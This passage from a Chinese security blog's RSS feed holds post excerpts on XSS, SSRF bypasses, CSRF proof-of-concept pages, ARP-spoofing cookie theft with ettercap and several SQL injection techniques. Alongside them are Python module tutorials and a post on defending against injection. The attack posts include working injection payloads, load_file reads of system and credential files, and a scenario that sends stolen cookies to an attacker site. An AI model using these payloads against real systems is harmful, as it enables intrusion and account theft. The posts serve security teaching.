1. 反射型XSS &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。
简单流程： 用户访问带有XSS代码的URL请求 服务器端接收数据后处理，然后返回带有XSS代码的数据发送给浏览器 浏览器解析带有XSS代码的数据后，最终造成XSS漏洞 可能攻击流程： • 用户aaa在网站www.xxx.com浏览网页 • 攻击者hacker发现www.xxx.com/xss.php存在反射型XSS漏洞，然后精心构造JavaScript代码， 构造的代码的功能为盗取用户Cookie并发送到指定站点www.xxser.com • hacker将带有反射型XSS漏洞的URL通过站内信发给aaa，站内信为一些诱惑信息，目的是使用户aaa点击 • 假设用户aaa点击了带有XSS漏洞的URL，则aaa的Cookie将被发送到www.xxser.com • hacker获取aaa的Cookie后可以以aaa的身份登陆www.xxx.com，从而得到aaa的敏感信息  2. 存储型XSS &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。</description>
    </item>
    
    <item>
      <title>Python的paramiko模块</title>
      <link>http://wyb0.com/posts/python-module-paramiko/</link>
      <pubDate>Thu, 14 Jul 2016 15:24:11 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-module-paramiko/</guid>
      <description> 安装 直接pip install paramiko安装
或者去http://www.paramiko.org/ 下载
执行一条远程命令 #!/usr/bin/env python #-*- coding:utf-8 -*- import paramiko #远程执行命令 ssh = paramiko.SSHClient() ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) ssh.connect(&amp;quot;192.168.188.134&amp;quot;,22,&amp;quot;reber&amp;quot;,&amp;quot;123456&amp;quot;) ssh_session = ssh.get_transport().open_session() stdin,stdout,stderr = ssh.exec_command(&amp;quot;ls -l&amp;quot;) print stdin print stdout.readlines() #返回执行结果 print stderr.readlines() #有错误信息就返回错误信息，没有就返回空 ssh.close()  上传与下载文件 #!/usr/bin/env python #-*- coding:utf-8 -*- import paramiko ftp = paramiko.Transport((&amp;quot;192.168.188.134&amp;quot;,22)) ftp.connect(username=&amp;quot;reber&amp;quot;,password=&amp;quot;123456&amp;quot;) sftp = paramiko.SFTPClient.from_transport(ftp) #将本地的文件上传到服务端的/tmp/a.txt remotepath=&#39;/tmp/a.txt&#39; localpath=&#39;C:\\Users\\WYB_9\\Desktop\\a.txt&#39; sftp.put(localpath, remotepath) #将服务端的文件下载到C:\\Users\\WYB_9\\Desktop\\system.log remotepath=&#39;/tmp/a.txt&#39; localpath=&#39;C:\\Users\\WYB_9\\Desktop\\system.log&#39; sftp.get(remotepath, localpath) ftp.close()  </description>
    </item>
    
    <item>
      <title>Python的cmd模块</title>
      <link>http://wyb0.com/posts/python-module-cmd/</link>
      <pubDate>Thu, 14 Jul 2016 09:44:06 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-module-cmd/</guid>
      <description>关于cmd模块  使用cmd模块创建的命令行解释器可以循环读取输入的所有行并且解析它们
 cmd模块的一些常用方法：  cmdloop()：类似与Tkinter的mainloop，运行Cmd解析器 onecmd(str)：读取输入，并进行处理，通常不需要重载该函数，而是使用更加具体的do_command来执行特定的命名 emptyline()：当输入空行时调用该方法 default(line)：当无法识别输入的command时调用该方法 completedefault(text,line,begidx,endidx):如果不存在针对的complete_*()方法，那么会调用该函数 precmd(line)：命令line解析之前被调用该方法 postcmd(stop，line)：命令line解析之后被调用该方法 preloop()：cmdloop()运行之前调用该方法 postloop()：cmdloop()退出之后调用该方法  用cmd模块简单实现shell命令  #!/usr/bin/env python #-*- coding:utf-8 -*- import sys import os import socket from cmd import Cmd class ClassShell(Cmd): &amp;quot;&amp;quot;&amp;quot;docstring for ClassShell&amp;quot;&amp;quot;&amp;quot; def __init__(self): Cmd.__init__(self) os.chdir(&amp;quot;C:/Users/WYB_9/Desktop&amp;quot;) hostName = socket.gethostname() self.prompt = &amp;quot;reber@&amp;quot; + hostName + &amp;quot; &amp;quot; + os.path.abspath(&#39;.&#39;) + &amp;quot;\n$ &amp;quot; def help_dir(self): print &amp;quot;dir [path]&amp;quot; def do_dir(self, arg): if not arg: print &amp;quot;\n&amp;quot;.</description>
    </item>
    
    <item>
      <title>无线下ettercap做中间人攻击</title>
      <link>http://wyb0.com/posts/in-the-wireless-use-ettercap-to-do-man-in-the-middle-attack/</link>
      <pubDate>Wed, 13 Jul 2016 09:22:39 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/in-the-wireless-use-ettercap-to-do-man-in-the-middle-attack/</guid>
      <description> 场景 攻击主机和被攻击主机在一个无线下面
开始攻击 1. 打开ettercap   2. 查看host列表  在软件的图形化界面点击sniff，选择unified sniffing选择网卡，然后单击hosts选项，选择scan for host，然后选择host list  3. 选定攻击目标  选择192.168.1.116的IP地址，点击Add to Target 1,然后选择网关的IP地址192.168.1.1，点击Add to Target 2  4. 开始攻击  ettercap选择&amp;rdquo;mitm&amp;rdquo;—&amp;rdquo;arp poisoning&amp;rdquo;—&amp;rdquo;Sniff remote connections&amp;rdquo;— &amp;ldquo;确定&amp;rdquo;，然后再在被攻击端查看arp，可知攻击已经成功  5. ettercap持续监听目标  软件上开始监听，被攻击端用浏览器登录路由器  6. 得到Cookie  点击主界面的&amp;rdquo;View&amp;rdquo; — &amp;ldquo;connetcions&amp;rdquo; 可以查看被攻击主机的一些网络链接  7. 用cookie登陆被入侵账户  打开火狐浏览器，通过firebug插件添加截获到的cookie从而登陆账户  </description>
    </item>
    
    <item>
      <title>攻击WPA保护下的802.11网络</title>
      <link>http://wyb0.com/posts/attack-802.11-network-under-wpa-protection/</link>
      <pubDate>Wed, 13 Jul 2016 08:18:59 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/attack-802.11-network-under-wpa-protection/</guid>
      <description>网络拓扑及信息 其中ip等信息如下： 攻击WPA保护下的802.11网络 1. 查看无线网卡并将其设置为监听模式   2. 打开kismet，进行基本设置   3. 选择名字为111111的AP为目标   4. 查看kismet抓包信息  kismet生成的nettxt文件的部分信息如下：
Network 104: BSSID D8:42:AC:C9:5C:1D Manuf : Shanghai First : Mon Nov 16 12:46:21 2015 Last : Mon Nov 16 13:10:23 2015 Type : infrastructure BSSID : D8:42:AC:C9:5C:1D SSID 1 Type : Probe Response SSID : &amp;quot;111111&amp;quot; First : Mon Nov 16 12:46:30 2015 Last : Mon Nov 16 13:10:22 2015 Max Rate : 54.</description>
    </item>
    
    <item>
      <title>Windows2003下搭建VPN</title>
      <link>http://wyb0.com/posts/windows2003-set-up-vpn/</link>
      <pubDate>Thu, 07 Jul 2016 10:39:50 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/windows2003-set-up-vpn/</guid>
      <description> 环境及要求 Windows2003下搭建基于PPTP(点对点隧道协议)的VPN服务器
安装服务 配置并启用路由和远程访问 新增路由协议 新增接口 新增VPN用户 尝试连接VPN </description>
    </item>
    
    <item>
      <title>iptables简单配置DMZ</title>
      <link>http://wyb0.com/posts/iptables-configure-dmz/</link>
      <pubDate>Tue, 05 Jul 2016 09:56:35 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/iptables-configure-dmz/</guid>
      <description>要求  内网可以访问外网 内网可以访问DMZ区 外网不能访问内网 外网能访问DMZ区的服务 DMZ区不能访问内网 DMZ区不能主动访问外网  拓扑   个主机IP信息  内网网段为：192.168.1.0/24
DMZ区网段为：172.16.1.0/24  iptables的策略  新建iptables.sh,内容如下：
#!/bin/bash iptables –F #清空此表中的规则 iptables –X #清空此表中的自定义规则 iptables –Z #清空此表中的计数器为0 iptables -P INPUT DROP iptables -P OUTPUT DROP iptables -P FORWARD DROP iptables -F -t nat iptables -X -t nat iptables -Z -t nat iptables -t nat -P PREROUTING ACCEPT iptables -t nat -P POSTROUTING ACCEPT iptables -t nat -P OUTPUT ACCEPT #添加必要的模块 modprobe ip_nat_ftp modprobe iptable_nat modprobe ip_conntrack modprobe ip_conntrack_ftp #开启转发功能 echo &amp;quot;1&amp;quot; &amp;gt; /proc/sys/net/ipv4/ip_forward #******************************************************************** #PREROUTING： iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j DNAT --to-destination 172.</description>
    </item>
    
    <item>
      <title>Python简单解码IP头</title>
      <link>http://wyb0.com/posts/python-simple-decode-ip-head/</link>
      <pubDate>Sun, 03 Jul 2016 20:06:39 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-simple-decode-ip-head/</guid>
      <description>解码IP头 Windows上运行时要以管理员身份运行
代码可以解码IP头统计通信信息并保存到文本，同时统计数量
#!/usr/bin/env python #-*- coding:utf-8 -*- import socket import os import sys import time import struct from ctypes import * host = &amp;quot;10.22.114.114&amp;quot; tcp_num = 0 udp_num = 0 icmp_num = 0 class IP(Structure): _fields_ = [ (&amp;quot;ihl&amp;quot;, c_ubyte,4), (&amp;quot;version&amp;quot;, c_ubyte,4), (&amp;quot;tos&amp;quot;, c_ubyte), (&amp;quot;len&amp;quot;, c_ushort), (&amp;quot;id&amp;quot;, c_ushort), (&amp;quot;offset&amp;quot;, c_ushort), (&amp;quot;ttl&amp;quot;, c_ubyte), (&amp;quot;protocol_num&amp;quot;,c_ubyte), (&amp;quot;sum&amp;quot;, c_ushort), (&amp;quot;src&amp;quot;, c_ulong), (&amp;quot;dst&amp;quot;, c_ulong) ] def __new__ (self,socket_buffer=None): return self.from_buffer_copy(socket_buffer) def __init__ (self,socket_buffer=None): self.</description>
    </item>
    
    <item>
      <title>Python的requests模块</title>
      <link>http://wyb0.com/posts/python-module-requests/</link>
      <pubDate>Sat, 02 Jul 2016 10:47:19 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-module-requests/</guid>
      <description>0x00 无参数的get请求  import requests resp = requests.get(&#39;http://www.baidu.com&#39;,timeout=1) #设置超时，超时后抛出timeout错误 print resp.text #一般用来输出纯文本，可得到unicode类型字符串 print resp.content #一般用来输出pdf、图片等，可得到原网页设定类型的字符串   0x01 有参数的get请求  import requests url = &#39;http://10.10.10.10:8080/Lab2.0/Login.action&#39; header = { &#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0&#39;, } param = {&#39;aaa&#39;:&#39;1111&#39;,&#39;bbb&#39;:&#39;2222&#39;} resp = requests.get(url,params=param,headers=header) print resp.url #得到url print resp.status_code #得到返回的状态码 print resp.headers #得到html头 print resp.cookies #得到cookie   0x02 POST请求  import requests url1 = &#39;http://10.10.10.10:8080/Lab2.0/Login.action&#39; url2 = &#39;http://10.</description>
    </item>
    
    <item>
      <title>SSRF</title>
      <link>http://wyb0.com/posts/ssrf/</link>
      <pubDate>Thu, 30 Jun 2016 15:30:54 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/ssrf/</guid>
      <description>0x00 什么是SSRF  &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;SSRF(Server-Side Request Forgery:服务请求伪造)是一种由攻击者构造，从而让服务端发起请求的一种安全漏洞，它将一个可以发起网络请求的服务当作跳板来攻击其他服务，SSRF的攻击目标一般是内网。
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;当服务端提供了从其他服务器获取数据的功能(如:从指定URL地址获取网页文本内容、加载指定地址的图片、下载等)，但是没有对目标地址做过滤与限制时就会出现SSRF。
 0x01 SSRF的危害  可以扫描内部网络
可以构造数据攻击内部主机
 0x02 漏洞挖掘  其实只要能对外发起网络请求就有可能存在SSRF漏洞。
1. 从WEB功能上寻找 通过URL分享内容 文件处理、编码处理、转码等服务 在线翻译 通过URL地址加载与下载图片 图片、文章的收藏 设置邮件接收服务器 2. 从URL关键字寻找 share、wap、url、link、src、source、target、u、3g、 display、sourceURl、imageURL、domain...   0x03 漏洞验证  http://www.aa.com/ss.php?image=http://www.baidu.com/img/bd_logo1.png 1. 右键在新窗口打开图片，图片地址为http://www.baidu.com/img/bd_logo1.png， 说明不存在SSRF漏洞。 2. firebug看网络连接信息，若没有http://www.baidu.com/img/bd_logo1.png 这个图片请求，则证明图片是aa.com服务端发起的请求，则可能存在SSRF漏洞。   0x04 绕过过滤  有时漏洞利用时会遇到IP限制，可用如下方法绕过：
* 使用@：http://A.com@10.10.10.10 = 10.10.10.10 * IP地址转换成十进制、八进制：127.0.0.1 = 2130706433 * 使用短地址：http://10.10.116.11 = http://t.cn/RwbLKDx * 端口绕过：ip后面加一个端口 * xip.io：10.0.0.1.xip.io = 10.0.0.1 www.10.0.0.1.xip.io = 10.0.0.1 mysite.</description>
    </item>
    
    <item>
      <title>Python的编码问题</title>
      <link>http://wyb0.com/posts/python-encode-setting/</link>
      <pubDate>Wed, 29 Jun 2016 15:14:11 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-encode-setting/</guid>
      <description>几个编码函数  chr(x) 可以将0-255之间的数字转化为ASCII表中的字符 ord(x) 可以ASCII表中的字符转化为0-255之间的数字 hex(x) 将整数转化为十六进制字符串 oct(x) 将整数转化为八进制字符串  在py文件开头 使用：
#!/usr/bin/env python #-*- coding: UTF-8 -*- 或： #coding=utf8  永久编码(推荐) 可以在python安装路径下的Lib\site-packages下新建文件sitecustomize.py文件，内容如下：
#coding=utf8 import sys reload(sys) sys.setdefaultencoding(&#39;utf8&#39;) # 此方法修改了python环境，设置系统默认编码，永久有效  编码转换 python默认unicode为中间编码，所以无论是何种编码，解码时默认都解码为unicode
# coding: UTF-8 &amp;quot;&amp;quot;&amp;quot;从gbk编码的文件中读出数据，重新编码为utf8然后存储&amp;quot;&amp;quot;&amp;quot; f = open(&#39;test.txt&#39;) # gbk编码 s = f.read() u = s.decode(&#39;gbk&#39;) # 将gbk解码为unicode # 通常要判断其编码方式是否为unicode # isinstance(s, unicode)可以用来判断是否为unicode # 这里已知是GBK编码，解码成unicode s = u.encode(&#39;utf8&#39;) # 将unicode编码为utf8 f.write(s) f.close()  网页的编码 #!</description>
    </item>
    
    <item>
      <title>sqlmapapi的简单使用</title>
      <link>http://wyb0.com/posts/sqlmapapi-usage/</link>
      <pubDate>Tue, 28 Jun 2016 11:19:11 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/sqlmapapi-usage/</guid>
      <description>关于sqlmapapi.py 当利用sqlmap时一次只能测试一个url，效率很低，而用sqlmapapi就可以实现批量
用于交互的方法 在sqlmap/lib/utils/api.py中:
# 用户方法 @get(&amp;quot;/task/new&amp;quot;) Create new task ID. @get(&amp;quot;/task/&amp;lt;taskid&amp;gt;/delete&amp;quot;) Delete own task ID. # 管理函数 @get(&amp;quot;/admin/&amp;lt;taskid&amp;gt;/list&amp;quot;) List task pull. @get(&amp;quot;/admin/&amp;lt;taskid&amp;gt;/flush&amp;quot;) Flush task spool (delete all tasks). # 核心交互函数 @get(&amp;quot;/option/&amp;lt;taskid&amp;gt;/list&amp;quot;) List options for a certain task ID @post(&amp;quot;/option/&amp;lt;taskid&amp;gt;/get&amp;quot;) Get the value of an option (command line switch) for a certain task ID @post(&amp;quot;/option/&amp;lt;taskid&amp;gt;/set&amp;quot;) Set an option (command line switch) for a certain task ID @post(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/start&amp;quot;) Launch a scan @get(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/stop&amp;quot;) Kill a scan @get(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/status&amp;quot;) Return status of a scan @get(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/data&amp;quot;) Retrieve the data of a scan @get(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/log/&amp;lt;start&amp;gt;/&amp;lt;end&amp;gt;&amp;quot;) Retrieve a subset of log messages @get(&amp;quot;/scan/&amp;lt;taskid&amp;gt;/log&amp;quot;) Retrieve the log messages @get(&amp;quot;/download/&amp;lt;taskid&amp;gt;/&amp;lt;target&amp;gt;/&amp;lt;filename:path&amp;gt;&amp;quot;) Download a certain file from the file system  sqlmapapi.</description>
    </item>
    
    <item>
      <title>CSRF</title>
      <link>http://wyb0.com/posts/csrf/</link>
      <pubDate>Tue, 28 Jun 2016 09:21:34 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/csrf/</guid>
      <description>0x00 概念  &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;当你登陆某个网站时，通常浏览器与网站都会形成一个会话，在会话没有结束时你可以执行发表文章、发邮件、 删除文章等操作，若会话结束，你再操作的话会提示你会话已经结束，请重新登陆。
&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;CSRF就是：攻击者通过一些技术手段欺骗用户的浏览器去访问一个自己曾认证过的网站并执行某些操作。也可以说CSRF就是黑客利用受害者的Cookie骗取服务器的信任从而执行某些操作
 0x01 利用  利用条件
 攻击者可以得知url的所有参数项并了解其含义 诱导用户访问构造好的POC  利用地方
 操作是有意义的(比如:修改密码等) 验证过于简单(参数固定、我们可以设置参数)   0x02 GET型CSRF攻击  若有论坛www.aa.com，论坛删除文章的操作是请求类似 http://www.aa.com/opt.php?id=135&amp;amp;act=del&amp;amp;name=Tom的链接  有用户A，他登陆了论坛，且有篇文章id为251，那么他的浏览器此时已经取得了论坛的信任  此时有hacker用户B，他构造了一个html为b.html，b.html内容如下： &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;test&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;img src=&amp;quot;http://www.aa.com/opt.php?id=251&amp;amp;act=del&amp;amp;name=A&amp;quot; /&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; 将b.html放在他自己搭建的网站上，网址为http://www.bb.com/b.html  恶意用户B将链接http://www.bb.com/b.html通过qq发送给用户A， 诱使他访问，用户A一旦访问，他id为251的文章就会被删除   0x03 POST型CSRF攻击  若网站www.xx.com有让用户修改密码的功能，但验证过于简单，形如下图： &amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt; &amp;lt;head&amp;gt; &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt; &amp;lt;title&amp;gt;aa&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form action=&amp;quot;http://172.23.10.200/setpasswd.php&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt; 昵称：&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;nickname&amp;quot; id=&amp;quot;nickname&amp;quot; value=&amp;quot;xxxxx&amp;quot;&amp;gt; 用户名：&amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;name&amp;quot; id=&amp;quot;name&amp;quot; value=&amp;quot;xiaoming&amp;quot;&amp;gt; 密码：&amp;lt;input type=&amp;quot;passwd&amp;quot; name=&amp;quot;passwd&amp;quot; id=&amp;quot;passwd&amp;quot; value=&amp;quot;&amp;quot;&amp;gt; 确认密码：&amp;lt;input type=&amp;quot;rpasswd&amp;quot; name=&amp;quot;rpasswd&amp;quot; id=&amp;quot;rpasswd&amp;quot; value=&amp;quot;&amp;quot;&amp;gt; &amp;lt;input type=&amp;quot;submit&amp;quot; name=&amp;quot;button&amp;quot; value=&amp;quot;提交&amp;quot;&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt;  此时我们就可以构造自动提交表单的xxxx.</description>
    </item>
    
    <item>
      <title>Python的logging模块</title>
      <link>http://wyb0.com/posts/python-module-logging/</link>
      <pubDate>Sat, 25 Jun 2016 08:55:30 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-module-logging/</guid>
      <description>使用流程  创建一个logger 创建一个handler，用于写入日志文件 定义handler的输出格式 将handler添加到logger 记录日志  示例  #!/usr/bin/env python # -*- coding: utf-8 -*- import logging class MyLog(object): &amp;quot;&amp;quot;&amp;quot;docstring for MyLog&amp;quot;&amp;quot;&amp;quot; def __init__(self, logfile, loglevel, logger): super(MyLog, self).__init__() # 创建一个logger self.logger = logging.getLogger(logger) self.logger.setLevel(logging.DEBUG) # 创建一个用于写入日志文件的handler fh = logging.FileHandler(logfile) fh.setLevel(logging.DEBUG) # 只要是写入文件的等级都为DEBUG，也可以设置为loglevel formatterf = logging.Formatter(&#39;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#39;) fh.setFormatter(formatterf) # 创建一个用于输出到控制台的handler ch = logging.StreamHandler() ch.setLevel(loglevel) formatterc = logging.Formatter(&#39;%(asctime)s - %(message)s&#39;) ch.setFormatter(formatterc) # 将handler添加到logger self.</description>
    </item>
    
    <item>
      <title>SQL注入之宽字节注入</title>
      <link>http://wyb0.com/posts/injection-of-wide-byte/</link>
      <pubDate>Fri, 24 Jun 2016 10:25:11 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection-of-wide-byte/</guid>
      <description>0x00 应用场景  在注入时通常会使用单引号、双引号等特殊字符。在应用中，通常为了安全，开发者会开启php的magic_quotes_gpc，或者使用addslashes、mysql_real_escape_string等函数对客户端传入的参数进行过滤，则注入的单引号或双引号就会被&amp;quot;\&amp;quot;转义，但是，如果服务端的数据库使用的是GB2312、GBK、GB18030等宽字节的编码时，则依然会造成注入。   0x01 测试代码  &amp;lt;?php $conn = mysql_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;); mysql_select_db(&#39;messages&#39;,$conn); if (isset($_GET[&#39;id&#39;])) { $id = addslashes($_GET[&#39;id&#39;]); //转义id $sql = &amp;quot;select * from msg where id=&#39;$id&#39;;&amp;quot;; echo $sql.&amp;quot;&amp;lt;br /&amp;gt;&amp;quot;; $result = mysql_query($sql); $rows = @mysql_fetch_assoc($result); if ($rows) { echo &#39;&amp;lt;table align=&amp;quot;left&amp;quot; border=&amp;quot;1&amp;quot;&amp;gt;&#39;; foreach ($rows as $key =&amp;gt; $value) { echo &#39;&amp;lt;tr align=&amp;quot;lift&amp;quot; height=&amp;quot;30&amp;quot;&amp;gt;&#39;; echo &#39;&amp;lt;td&amp;gt;&#39;.$key.&#39;----&#39;.$value.&#39;&amp;lt;/td&amp;gt;&#39;; echo &#39;&amp;lt;/tr&amp;gt;&#39;; } echo &#39;&amp;lt;/table&amp;gt;&#39;; } else { echo mysql_error(); } } else { echo &amp;quot;please input id.</description>
    </item>
    
    <item>
      <title>SQL注入之防御</title>
      <link>http://wyb0.com/posts/injection-of-defense/</link>
      <pubDate>Thu, 23 Jun 2016 15:32:34 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection-of-defense/</guid>
      <description>0x00 要做的事  也就是找到注入点然后修复   0x01 防御方法  使用转义函数
如：addslashes()和mysql_real_escape_string()
在php.ini设置auto_prepend_file自动在脚本执行前在首部加载文件
   &amp;lt;?php //简单过滤 $filter = array(&amp;amp;$_GET,&amp;amp;$_POST,&amp;amp;$_COOKIE); foreach ($filter as $key =&amp;gt; $value){ foreach ($value as $k =&amp;gt; $v){ $filter[$key][$k] = mysql_real_escape_string($v); } } ?&amp;gt;    检查数据类型
使用(int)或settype()等将数字等进行强制转换
对邮箱、日期等也进行检查
 使用预编译语句绑定变量(一般为防御SQL注入的最佳方式)
&amp;lt;?php //预编译 $mysqli = new mysqli(&amp;quot;localhost&amp;quot;,&amp;quot;root&amp;quot;,&amp;quot;123456&amp;quot;,&amp;quot;share&amp;quot;); $mysqli-&amp;gt;query(&amp;quot;set names utf8&amp;quot;); $sql = &amp;quot;INSERT INTO test (name,sex,age) VALUE(?,?,?)&amp;quot;; $s = $mysqli-&amp;gt;prepare($sql); //绑定参数 $name = &amp;quot;Tom&amp;quot;; $sex = &amp;quot;M&amp;quot;; $age = 23; $s-&amp;gt;bind_param(&amp;quot;ssi&amp;quot;,$name,$sex,$age);//ssi的意思是字符、字符、整型 //执行 $result = $s-&amp;gt;execute(); var_dump($result); $s-&amp;gt;close(); ?</description>
    </item>
    
    <item>
      <title>SQL注入之布尔型注入</title>
      <link>http://wyb0.com/posts/injection-of-boolian-based/</link>
      <pubDate>Wed, 22 Jun 2016 23:32:34 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection-of-boolian-based/</guid>
      <description>0x00 特点  当页面存在注入，但是没有显示位，且没有用echo &amp;quot;mysql_error()&amp;quot;输出错误信息时可以用， 它一次只能猜测一个字节，速度慢，但是只要存在注入就能用   0x01 利用方式  用and连接前后语句：www.xxx.com/aa.php?id=1 and (注入语句) --+ 根据返回页面是否相同来得到数据   0x02 注入步骤  找注入点、猜闭合字符 猜解列数、尝试得到显示位 猜数据库名 猜表名 猜列名 猜列值  找到注入点，判断闭合字符   尝试猜解列数，得到显示位   得到数据库名  最终得到第五个数据库名为security   得到表名  最终依次猜的表名为users   得到列名  同理最终得到第2列列名为username，第3列列名为password   得到列值  依次得到为admin4，同理可得其他数据   0x04 附上python脚本  #!</description>
    </item>
    
    <item>
      <title>SQL注入之报错型注入</title>
      <link>http://wyb0.com/posts/injection-of-error-based/</link>
      <pubDate>Wed, 22 Jun 2016 15:30:54 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection-of-error-based/</guid>
      <description>0x00 前提  一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用， 它的特点是注入速度快，但是语句较复杂,不能用group_concat(),只能用limit依次猜解   0x01 利用方式  count(*)、floor()、rand()、group by不可或缺
报错注入用一个公式，只要套用公式即可，公式如下(后两个公式有32位的限制):
?id=2&amp;rsquo; and (select 1 from (select count(*),concat( floor(rand(0)*2),(select (select (查询语句)) from information_schema.tables limit 0,1))x from information_schema.tables group by x )a )--+
?id=2&amp;rsquo; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)--+
?id=1&amp;rsquo; and extractvalue(1, concat(0x7e, (select @@version),0x7e))--+
 0x02 公式解析  floor()是取整数 rand()在0和1之间产生一个随机数 rand(0)*2将取0到2的随机数 floor(rand()*2)有两条记录就会报错 floor(rand(0)*2)记录需为3条以上，且3条以上必报错，返回的值是有规律的 count(*)是用来统计结果的，相当于刷新一次结果 group by对数据分组时会先看看虚拟表里有没有这个值,若没有就插入,若存在则count(*)加1 group by时floor(rand(0)*2)会被执行一次,若虚表不存在记录,插入虚表时会再执行一次   0x03 注入步骤  得到闭合字符 猜列数、尝试爆显示位 得到数据库个数和数据库名 得到表个数和表名 得到列数量和列名 得到列值  猜测闭合字符   猜测列数   尝试得到显示位   报错得到数据库个数   报错得到数据库名   报错得到表名   报错得到列名   得到列值   0x04 附上利用代码  #!</description>
    </item>
    
    <item>
      <title>SQL注入之联合查询</title>
      <link>http://wyb0.com/posts/injection-of-union-select/</link>
      <pubDate>Tue, 21 Jun 2016 22:30:18 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection-of-union-select/</guid>
      <description> 0x00 前提  要用联合查询进行注入则：页面必须有显示位   0x01 联合查询  union可合并两个或多个select语句的结果集， 前提是两个select必有相同列、且各列的数据类型也相同   0x02 注入步骤  找注入点且得到闭合字符 判断数据库类型 猜解列数，得到显示位 得到基本信息(如：数据库名、数据库版本、当前数据库名等) 得到数据库名 得到表名 得到列名 得到列值  1. 找到注入点得到闭合字符   2. 判断数据库类型   3. 猜解列数，得到显示位   4. 得到基本信息(数据库名、版本、数据库版本等)   5. 得到数据库   6. 得到security数据库的表名   7. 猜解列名   8. 猜解数据   </description>
    </item>
    
    <item>
      <title>SQL注入之MySQL函数利用</title>
      <link>http://wyb0.com/posts/injection-of-mysql-function/</link>
      <pubDate>Mon, 20 Jun 2016 08:10:27 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection-of-mysql-function/</guid>
      <description>0x00 load_file()  条件:   1. 要有file_priv权限 2. 知道文件绝对路径 3. 能使用union 4. 对web目录有读权限 注：若过滤了单引号，则可以将函数中的字符进行hex编码    一般步骤
 读/etc/init.d下的东西，这里有配置文件路径   ?id=1&#39; union select 1,2,load_file(&#39;/etc/init.d/httpd&#39;)    得到web安装路径
   ?id=1&#39; union select 1,2,load_file(&#39;/etc/apache/conf/httpd.conf&#39;)    读取密码文件   ?id=1&#39; union select 1,2,load_file(&#39;/site/xxx.com/conf/conn.inc.php&#39;)    0x01 into outfile  条件：   1. 要有file_priv权限 2. 知道网站绝对路径 3. 要能用union 4. 对web目录有写权限 5. 没有过滤单引号    一般方法   当知道路径时，可以直接用?</description>
    </item>
    
    <item>
      <title>SQL注入之判断数据库类型</title>
      <link>http://wyb0.com/posts/injection-of-check-database-type/</link>
      <pubDate>Sun, 19 Jun 2016 22:15:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/injection-of-check-database-type/</guid>
      <description> 0x01 扫描端口 0x02 指纹信息 0x03 在URL后面直接判断  Access: and (select count(*) from MSysAccessObjects)&amp;gt;0 返回正常说明是access and exists(select count(*) from 表) SQLserver: and (select count(*) from sysobjects) &amp;gt;0 返回正常说明是mssql MySQL: and length(user())&amp;gt;0 返回正常说明是MySQL   0x04 其他方法  在mssql中可以调用substring。oracle则只可调用substr   </description>
    </item>
    
    <item>
      <title>MySQL的information_schema库</title>
      <link>http://wyb0.com/posts/mysql-database-table-information_schema/</link>
      <pubDate>Sun, 19 Jun 2016 20:18:48 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/mysql-database-table-information_schema/</guid>
